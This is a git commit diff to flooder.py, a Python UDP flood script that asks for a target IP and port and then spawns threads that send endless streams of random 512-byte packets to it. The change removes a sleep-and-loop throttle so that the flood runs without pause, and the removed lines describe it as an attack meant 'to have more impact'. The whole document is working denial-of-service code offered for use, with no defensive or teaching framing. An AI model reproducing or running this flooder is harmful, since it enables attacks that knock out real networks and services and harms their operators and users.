f85942e3b3751ef81e28a75c02011f3bc521c2ac
Marcel Dan <gigi.dan2011@gmail.com>
2020-03-13 00:33:20 +0100

    minor changes

--- flooder.py
+++ flooder.py
@@ -8,21 +8,17 @@ ip = str(input(" IP: "))
 port = int(input(" PORT: "))
 times = int(input(" PACKETS PER THREAD: "))
 threads = int(input(" THREADS: "))
-loopOfLoop = int(input(" LOOPS OF LOOPS (restarting attack to have more impact): "))
-sleepTime  = float(input(" SLEEP TIME BETWEEN LOOPS: "))
 def main():
+	print("STARTING " + str(threads) + "threads" + "... " + "\n")
 	for y in range(threads):
 		th = threading.Thread(target=go)
 		th.start()
 def go():
-	loop = 0
-	data = random._urandom(1024)
+	print("THREAD RUNNING ")
+	data = random._urandom(512)
 	while 1:
-		time.sleep(sleepTime)
-		while loop<loopOfLoop:
-			loop+=1
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		addr = (str(ip),int(port))
+		for x in range(times):
+			s.sendto(data,addr)
 main()
